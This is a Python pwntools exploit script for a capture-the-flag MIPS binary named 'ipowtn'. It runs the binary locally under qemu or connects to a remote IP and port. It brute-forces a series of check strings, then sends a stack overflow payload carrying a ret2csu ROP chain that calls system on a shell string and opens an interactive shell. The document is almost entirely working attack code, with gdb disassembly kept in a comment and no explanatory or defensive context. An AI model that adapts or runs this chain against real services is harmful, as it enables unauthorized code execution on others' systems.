
from pwn import *
from time import sleep
import sys
context.binary = "./ipowtn"

if sys.argv[1] == "l":
    io = process(["qemu-mips", "-L", "/usr/mips-linux-gnu/", "./ipowtn"])
elif sys.argv[1] == "d":
    io = process(["qemu-mips", "-g", "1234", "./ipowtn"], timeout = 9999)
else:
    io = remote("106.75.64.188", 18067)


def brute():
    cnt = 0
    checks = ["We", "are", "grad", "from", "nomal", "arch", "bcz", "W3Are", "hakker\x8e\x88"]

    while cnt < 9:
        for s in checks:
            io.send(s.ljust(8, '\0'))
            sleep(0.01)
            text = io.recvline(timeout = 0.1)
            if "no!!! guess it!!!!!!" not in text:
                cnt += 1
                del checks[checks.index(s)]
                success("success {} {}".format(cnt, checks))
                # raw_input("DEBUG:")
                break
    context.log_level = "debug"
    success("done!")

def csu_rop():
    sh = 0x401320
    system_plt = 0x400840
    system_got = 0x41144C
    '''
    (gdb) x/9i 0x401200
   0x401200 <__libc_csu_init+104>:	lw	t9,0(s1)
   0x401204 <__libc_csu_init+108>:	addiu	s0,s0,1
   0x401208 <__libc_csu_init+112>:	move	a0,s3
   0x40120c <__libc_csu_init+116>:	move	a1,s4
   0x401210 <__libc_csu_init+120>:	jalr	t9
   0x401214 <__libc_csu_init+124>:	move	a2,s5
   0x401218 <__libc_csu_init+128>:	sltu	v0,s0,s2
   0x40121c <__libc_csu_init+132>:	bnez	v0,0x401200 <__libc_csu_init+104>
   0x401220 <__libc_csu_init+136>:	addiu	s1,s1,4

   (gdb) x/9i 0x401224
   0x401224 <__libc_csu_init+140>:	lw	ra,52(sp)
   0x401228 <__libc_csu_init+144>:	lw	s5,48(sp)
   0x40122c <__libc_csu_init+148>:	lw	s4,44(sp)
   0x401230 <__libc_csu_init+152>:	lw	s3,40(sp)
   0x401234 <__libc_csu_init+156>:	lw	s2,36(sp)
   0x401238 <__libc_csu_init+160>:	lw	s1,32(sp)
   0x40123c <__libc_csu_init+164>:	lw	s0,28(sp)
   0x401240 <__libc_csu_init+168>:	jr	ra
   0x401244 <__libc_csu_init+172>:	addiu	sp,sp,56
    '''
    # s1 = t9
    # s3 = a0
    # s0 = 0
    # s2 = 1
    payload  = flat(0x401224)
    payload += fit({
            0x24: flat(0),
            0x28: flat(system_got), # dummy
            0x2c: flat(1),
            0x30: flat(sh),
            0x3c: flat(0x401200),
            0x74: flat(system_plt)
        }, filler = '\0')
    # print hexdump(payload)

    assert '\x0a' not in payload
    return payload

if __name__ == "__main__":
    raw_input("ATTACH: ")
    brute()

    payload  = 'x' * 0x24
    payload += flat(csu_rop())

    io.sendlineafter("... go!\n", payload)
    raw_input("DEBUG: ")

    io.interactive()
